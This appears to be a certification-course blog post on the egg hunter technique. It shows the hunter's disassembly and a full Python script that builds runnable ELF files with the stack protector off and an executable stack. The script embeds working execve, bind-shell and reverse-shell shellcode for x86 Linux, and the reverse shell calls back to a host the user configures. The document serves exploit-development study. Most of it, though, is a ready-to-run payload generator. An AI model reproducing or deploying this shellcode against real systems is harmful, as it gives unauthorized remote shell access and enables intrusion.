# Assignment 3: Egg Hunter

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/

Student ID: SLAE-670

### Problem

- Study about the Egg Hunter shellcode
- Create a working demo of the Egghunter
- Should be configurable for different payloads

### Solution

The first part of the task was to research what the Egg Hunter is and how it works. The following paper was used as the theoretical basis and the cornerstone of the final implementation:

![Safely Searching Process Virtual Address Space](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf) by skape

The following Egg Hunter implementation used was used as the prototype to complete the task:

```nasm
00000000  6681C9FF0F        or cx,0xfff
00000005  41                inc ecx
00000006  6A43              push byte +0x43
00000008  58                pop eax
00000009  CD80              int 0x80
0000000B  3CF2              cmp al,0xf2
0000000D  74F1              jz 0x0
0000000F  B841414141        mov eax,0x41414141
00000014  89CF              mov edi,ecx
00000016  AF                scasd
00000017  75EC              jnz 0x5
00000019  AF                scasd
0000001A  75E9              jnz 0x5
0000001C  FFE7              jmp edi
```

As described skape's paper, the above code will execute the `sigaction()` system call on each memory within an address space incrementally in an attempt to identify accesible memory regions. For each region identified, the code will incrementally traverse it looking for the Egg, which is nothing but a unique known string injected at the beginning of the actual shellcode. Since the Egg is 8-byte aligned, the next address after the Egg will be the shellcode, which is where execution flow is transfered after the Egg is identified. 

The final imlementation in Python uses the prototype Egg Hunter shellcode to add egg, shellcode and output file configuration options. The script allows to choose between Execve, Bind TCP, and Reverse TCP shellcodes, providing attional functionality for setting the remote and local host IP and port parameters. 

## egghunter.py

```python
#!/usr/bin/python

#####	Generate an executable 		

def generateElf(shellcode):
	print "\n[+] Staged Shellcode Length: %d\n" % len(bytearray(shellcode))
	sc = ""
	for c in bytearray(shellcode):
		sc += "\\x%02x" % c
	print sc

	egg = ""
	for c in range(0, 8, 2):
		egg += "\\x%s%s" % (args.egg[c], args.egg[c+1])
	print "\n[+] Egg: %s" % egg

	skeleton = '''
	#include<stdio.h>
	#include<string.h>
	#define EGG "__EGG__"
	unsigned char code[] = EGG EGG "__SHELLCODE__";
	unsigned char hunter[] = \\
		"\\x66\\x81\\xc9\\xff\\x0f\\x41\\x6a\\x43\\x58\\xcd\\x80\\x3c\\xf2\\x74"
		"\\xf1\\xb8"   EGG  "\\x89\\xcf\\xaf\\x75\\xec\\xaf\\x75\\xe9\\xff\\xe7";
	main() {
		printf("Hunter Shellcode Length:  %d\\n", strlen(hunter));
		int (*ret)() = (int(*)())hunter;
		ret();
	}	
	'''

	skeleton = skeleton.replace("__EGG__", egg)
	skeleton = skeleton.replace("__SHELLCODE__", sc)

	with open("a.c", "w") as f:
		f.write(skeleton)

	os.system("gcc a.c -fno-stack-protector -z execstack")
	os.rename("a.out", args.outfile)
	os.rename("a.c", "%s.c" % args.outfile)

	print "\n[+] Executable: %s\n" % args.outfile


def execShellcode(args):

	shellcode = (
		"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x8d"
		"\x1c\x24\x50\x8d\x14\x24\x53\x8d\x0c\x24\xb0\x0b\xcd\x80"
	)

	generateElf(shellcode)


def bindShellcode(args):

	if args.lport not in range(1,65536):
		sys.exit("[!] Bad LPORT!")

	port = struct.pack(">H", int(args.lport))

	shellcode = (
		"\x31\xc0\x31\xdb\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xb3\x01"
		"\xb0\x66\xcd\x80\x89\xc6\x31\xc0\xb0\x01\x50\x89\xe1\x51"
		"\x40\x50\x48\x50\x56\x89\xe1\xb3\x0e\xb0\x66\xcd\x80\x31"
		"\xc0\x50\x66\x68"+port+"\x66\x6a\x02\x89\xe1\x6a\x10\x51"
		"\x56\x89\xe1\xb3\x02\xb0\x66\xcd\x80\x66\x68\x02\x10\x56"
		"\x89\xe1\xb3\x04\xb0\x66\xcd\x80\x31\xc0\x50\x50\x56\x89"
		"\xe1\xb3\x05\xb0\x66\xcd\x80\x89\xc7\x31\xc9\xb1\x02\x89"
		"\xfb\x31\xc0\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68"
		"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2"
		"\x53\x89\xe1\xb0\x0b\xcd\x80\xe9\x76\xff\xff\xff"
		)

	generateElf(shellcode)


def revShellcode(args):

	if len(args.lhost.split(".")) != 4: 
		sys.exit("[!] Bad LHOST!")

	if args.lport not in range(1,65536):
		sys.exit("[!] Bad LPORT!")

	host = ""
	addr = args.lhost.split(".")
	for a in addr:
		host += struct.pack(">B", int(a))

	port = struct.pack(">H", int(args.lport))

	shellcode = (
		"\x31\xc0\x31\xdb\x6a\x06\x6a\x01\x6a\x02\x89\xe1"
		"\xb3\x01\xb0\x66\xcd\x80\x89\xc6\x68"+host+"\x66"
		"\x68"+port+"\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56"
		"\x89\xe1\xb3\x03\xb0\x66\xcd\x80\x31\xc9\xb1\x02"
		"\x89\xf3\x31\xc0\xb0\x3f\xcd\x80\x49\x79\xf9\x31"
		"\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
		"\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
		)

	generateElf(shellcode)


import sys
import os
import struct
import argparse

a = argparse.ArgumentParser()
suba = a.add_subparsers()

execa = suba.add_parser("exec")
execa.set_defaults(func=execShellcode)

binda = suba.add_parser("bind")
binda.add_argument("--lport", "-p", type=int, required=True, help="LPORT (must be between 1 and 65535)")
binda.set_defaults(func=bindShellcode)

reva = suba.add_parser("reverse")
reva.add_argument("--lhost", "-l", required=True, help="LHOST (must be IPv4)")
reva.add_argument("--lport", "-p", type=int, required=True, help="LPORT (must be between 1 and 65535)")
reva.set_defaults(func=revShellcode)

a.add_argument("--egg", "-e", default="41414141", help="EGG to hunt (must be 8 bytes; default: 41414141)")
a.add_argument("--outfile", "-o", default="hunter", help="Output ELF executable filename (default: hunter)")

args = a.parse_args()
print "\n",args,"\n"

if len(args.egg) != 8: 
	sys.exit("[!] Bad EGG!")

args.func(args)
```

## Example

A sample run produces the following output:

![alt text](https://github.com/adeptex/SLAE/blob/master/Assignment-3/a3.png "Example")
